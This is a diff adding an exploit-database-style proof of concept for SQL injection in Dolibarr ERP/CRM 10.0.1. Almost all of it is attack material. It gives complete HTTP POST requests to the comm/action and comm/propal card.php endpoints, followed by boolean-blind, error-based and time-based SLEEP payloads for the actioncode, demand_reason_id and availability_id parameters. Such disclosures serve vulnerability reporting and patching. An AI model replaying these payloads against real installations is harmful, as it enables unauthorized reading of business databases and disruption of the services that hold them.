@@ -1,0 +1,140 @@
+# Exploit Title: Dolibarr ERP/CRM - Multiple Sql Injection
+# Exploit Author: Metin Yunus Kandemir (kandemir)
+# Vendor Homepage: https://www.dolibarr.org/
+# Software Link: https://www.dolibarr.org/downloads
+# Version: 10.0.1
+# Category: Webapps
+# Tested on: Xampp for Linux
+# Software Description : Dolibarr ERP & CRM is a modern and easy to use
+software package to manage your business...
+==================================================================
+
+
+actioncode (POST) - Sql injection PoC
+
+http request:
+
+POST /dolibarr-10.0.1/htdocs/comm/action/card.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
+Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://localhost/dolibarr-10.0.1/htdocs/comm/action/card.php?action=edit&id=774
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 610
+Cookie:
+DOLSESSID_60ec554596b730ca6f03816d85cd400a=aaf3a3b284478257b59be81cf1a70fc3
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+token=%242y%2410%24hG2u8WGSj3ynCl99dYPZGejK322YaCxkfSRW%2FIC0mt8vk7%2FGTtU8a&action=update&id=774&ref_ext=&actioncode=[SQLi]&label=Product+created&ap=09%2F05%2F2019&apday=05&apmonth=09&apyear=2019&aphour=16&apmin=59&apsec=10&p2=09%2F05%2F2019&p2day=05&p2month=09&p2year=2019&p2hour=16&p2min=59&p2sec=10&complete=-1&location=&removedassigned=&assignedtouser=-1&socid=-1&projectid=0&priority=&fk_element=178&elementtype=product&note=Author%3A+admin%3Cbr%3E%0D%0AProduct+created&edit=Save
+
+
+
+Parameter: actioncode (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or
+GROUP BY clause
+    Payload:
+token=$2y$10$hG2u8WGSj3ynCl99dYPZGejK322YaCxkfSRW/IC0mt8vk7/GTtU8a&action=update&id=774&ref_ext=&actioncode=AC_OTH_AUTO'
+RLIKE (SELECT (CASE WHEN (5096=5096) THEN 0x41435f4f54485f4155544f ELSE
+0x28 END))--
+HQaG&label=Product+created&ap=09/05/2019&apday=05&apmonth=09&apyear=2019&aphour=16&apmin=59&apsec=10&p2=09/05/2019&p2day=05&p2month=09&p2year=2019&p2hour=16&p2min=59&p2sec=10&complete=-1&location=&removedassigned=&assignedtouser=-1&socid=-1&projectid=0&priority=&fk_element=178&elementtype=product&note=Author%3A+admin%3Cbr%3E%0D%0AProduct+created&edit=Save
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause (FLOOR)
+    Payload:
+token=$2y$10$hG2u8WGSj3ynCl99dYPZGejK322YaCxkfSRW/IC0mt8vk7/GTtU8a&action=update&id=774&ref_ext=&actioncode=AC_OTH_AUTO'
+AND (SELECT 1665 FROM(SELECT COUNT(*),CONCAT(0x716b707871,(SELECT
+(ELT(1665=1665,1))),0x7170707071,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--
+XqJd&label=Product+created&ap=09/05/2019&apday=05&apmonth=09&apyear=2019&aphour=16&apmin=59&apsec=10&p2=09/05/2019&p2day=05&p2month=09&p2year=2019&p2hour=16&p2min=59&p2sec=10&complete=-1&location=&removedassigned=&assignedtouser=-1&socid=-1&projectid=0&priority=&fk_element=178&elementtype=product&note=Author%3A+admin%3Cbr%3E%0D%0AProduct+created&edit=Save
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload:
+token=$2y$10$hG2u8WGSj3ynCl99dYPZGejK322YaCxkfSRW/IC0mt8vk7/GTtU8a&action=update&id=774&ref_ext=&actioncode=AC_OTH_AUTO'
+AND (SELECT 6833 FROM (SELECT(SLEEP(5)))gCwf)--
+jPLl&label=Product+created&ap=09/05/2019&apday=05&apmonth=09&apyear=2019&aphour=16&apmin=59&apsec=10&p2=09/05/2019&p2day=05&p2month=09&p2year=2019&p2hour=16&p2min=59&p2sec=10&complete=-1&location=&removedassigned=&assignedtouser=-1&socid=-1&projectid=0&priority=&fk_element=178&elementtype=product&note=Author%3A+admin%3Cbr%3E%0D%0AProduct+created&edit=Save
+
+.
+.
+.
+.
+.
+
+demand_reason_id, availability_id (POST) - Sql injection PoC
+
+http request:
+
+POST /dolibarr-10.0.1/htdocs/comm/propal/card.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
+Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://localhost/dolibarr-10.0.1/htdocs/comm/propal/card.php?action=create&leftmenu=propals
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 471
+Cookie:
+DOLSESSID_60ec554596b730ca6f03816d85cd400a=aaf3a3b284478257b59be81cf1a70fc3
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+token=%242y%2410%24L49yBo3dzNwsREPqDxRH8uR7HJ4eaM9ULG2yw1XgypioE2XZaw5lK&action=add&ref_client=&socid=140&re=09%2F09%2F2019&reday=09&remonth=09&reyear=2019&duree_validite=15&cond_reglement_id=0&mode_reglement_id=&demand_reason_id=[SQLi]&availability_id=[SQLi]&shipping_method_id=-1&date_livraison=&date_livraisonday=&date_livraisonmonth=&date_livraisonyear=&projectid=0&incoterm_id=0&location_incoterms=&model=azur&multicurrency_code=EUR&note_public=&note_private=&createmode=empty
+
+
+
+Parameter: demand_reason_id (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or
+GROUP BY clause
+    Payload:
+token=$2y$10$L49yBo3dzNwsREPqDxRH8uR7HJ4eaM9ULG2yw1XgypioE2XZaw5lK&action=add&ref_client=&socid=140&re=09/09/2019&reday=09&remonth=09&reyear=2019&duree_validite=15&cond_reglement_id=0&mode_reglement_id=&demand_reason_id=0
+RLIKE (SELECT (CASE WHEN (8405=8405) THEN 0 ELSE 0x28
+END))&availability_id=0&shipping_method_id=-1&date_livraison=&date_livraisonday=&date_livraisonmonth=&date_livraisonyear=&projectid=0&incoterm_id=0&location_incoterms=&model=azur&multicurrency_code=EUR&note_public=&note_private=&createmode=empty
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause (FLOOR)
+    Payload:
+token=$2y$10$L49yBo3dzNwsREPqDxRH8uR7HJ4eaM9ULG2yw1XgypioE2XZaw5lK&action=add&ref_client=&socid=140&re=09/09/2019&reday=09&remonth=09&reyear=2019&duree_validite=15&cond_reglement_id=0&mode_reglement_id=&demand_reason_id=0
+OR (SELECT 8076 FROM(SELECT COUNT(*),CONCAT(0x716a626b71,(SELECT
+(ELT(8076=8076,1))),0x71787a7871,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY
+x)a)&availability_id=0&shipping_method_id=-1&date_livraison=&date_livraisonday=&date_livraisonmonth=&date_livraisonyear=&projectid=0&incoterm_id=0&location_incoterms=&model=azur&multicurrency_code=EUR&note_public=&note_private=&createmode=empty
+
+.
+.
+
+Parameter: availability_id (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or
+GROUP BY clause
+    Payload:
+token=$2y$10$L49yBo3dzNwsREPqDxRH8uR7HJ4eaM9ULG2yw1XgypioE2XZaw5lK&action=add&ref_client=&socid=140&re=09/09/2019&reday=09&remonth=09&reyear=2019&duree_validite=15&cond_reglement_id=0&mode_reglement_id=&demand_reason_id=0&availability_id=0
+RLIKE (SELECT (CASE WHEN (6909=6909) THEN 0 ELSE 0x28
+END))&shipping_method_id=-1&date_livraison=&date_livraisonday=&date_livraisonmonth=&date_livraisonyear=&projectid=0&incoterm_id=0&location_incoterms=&model=azur&multicurrency_code=EUR&note_public=&note_private=&createmode=empty
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause (FLOOR)
+    Payload:
+token=$2y$10$L49yBo3dzNwsREPqDxRH8uR7HJ4eaM9ULG2yw1XgypioE2XZaw5lK&action=add&ref_client=&socid=140&re=09/09/2019&reday=09&remonth=09&reyear=2019&duree_validite=15&cond_reglement_id=0&mode_reglement_id=&demand_reason_id=0&availability_id=0
+OR (SELECT 3789 FROM(SELECT COUNT(*),CONCAT(0x716a626b71,(SELECT
+(ELT(3789=3789,1))),0x71787a7871,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY
+x)a)&shipping_method_id=-1&date_livraison=&date_livraisonday=&date_livraisonmonth=&date_livraisonyear=&projectid=0&incoterm_id=0&location_incoterms=&model=azur&multicurrency_code=EUR&note_public=&note_private=&createmode=empty
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload:
+token=$2y$10$L49yBo3dzNwsREPqDxRH8uR7HJ4eaM9ULG2yw1XgypioE2XZaw5lK&action=add&ref_client=&socid=140&re=09/09/2019&reday=09&remonth=09&reyear=2019&duree_validite=15&cond_reglement_id=0&mode_reglement_id=&demand_reason_id=0&availability_id=0
+AND (SELECT 9904 FROM
+(SELECT(SLEEP(5)))ZKPW)&shipping_method_id=-1&date_livraison=&date_livraisonday=&date_livraisonmonth=&date_livraisonyear=&projectid=0&incoterm_id=0&location_incoterms=&model=azur&multicurrency_code=EUR&note_public=&note_private=&createmode=empty
